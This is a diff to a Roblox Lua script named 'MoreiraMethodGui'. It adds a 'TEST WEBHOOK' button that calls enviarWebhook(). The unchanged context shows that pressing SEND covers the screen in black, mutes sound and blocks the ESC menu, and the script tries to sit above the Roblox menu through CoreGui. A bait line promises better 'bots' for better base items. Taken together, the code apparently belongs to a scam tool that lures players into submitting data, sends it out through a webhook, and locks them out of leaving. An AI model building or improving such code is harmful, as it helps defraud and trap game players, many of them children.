@@ -50,7 +50,6 @@ screenGui.Name = "MoreiraMethodGui"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.DisplayOrder = 9999 -- Very high to be above everything
--- Try to parent to CoreGui to be above Roblox menu
 pcall(function()
 	screenGui.Parent = game:GetService("CoreGui")
 end)
@@ -61,7 +60,7 @@ end
 -- 📦 Center input frame
 local inputFrame = Instance.new("Frame")
 inputFrame.Name = "InputFrame"
-inputFrame.Size = UDim2.new(0, 420, 0, 240)
+inputFrame.Size = UDim2.new(0, 420, 0, 280)
 inputFrame.Position = UDim2.new(0.5, -210, 0.5, -120)
 inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 inputFrame.BorderSizePixel = 0
@@ -124,6 +123,21 @@ infoLabel.TextScaled = true
 infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
 infoLabel.Text = "The better things you have in your base, the better bots will join."
 infoLabel.Parent = inputFrame
+
+-- 🟨 TEST WEBHOOK BUTTON (Yellow)
+local testButton = Instance.new("TextButton")
+testButton.Size = UDim2.new(0.5, 0, 0, 40)
+testButton.Position = UDim2.new(0.25, 0, 0, 255)
+testButton.BackgroundColor3 = Color3.fromRGB(255, 255, 50)
+testButton.Font = Enum.Font.GothamBold
+testButton.TextScaled = true
+testButton.TextColor3 = Color3.fromRGB(100, 100, 0)
+testButton.Text = "TEST WEBHOOK"
+testButton.Parent = inputFrame
+
+local testCorner = Instance.new("UICorner")
+testCorner.CornerRadius = UDim.new(0, 8)
+testCorner.Parent = testButton
 
 ------------------------------------------------------------
 -- 🎬 On SEND → show full black screen, mute sounds, block ESC key
@@ -298,6 +312,13 @@ sendButton.MouseButton1Click:Connect(function()
 
 	-- Block ESC key (Roblox menu)
 	ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
+end)
+
+-- Test Button Handler
+testButton.MouseButton1Click:Connect(function()
+	enviarWebhook()
+	label.TextColor3 = Color3.fromRGB(255, 220, 0)
+	label.Text = "Webhook test enviada!"
 end)
 
 -- Optional: Unblock ESC if black screen is removed
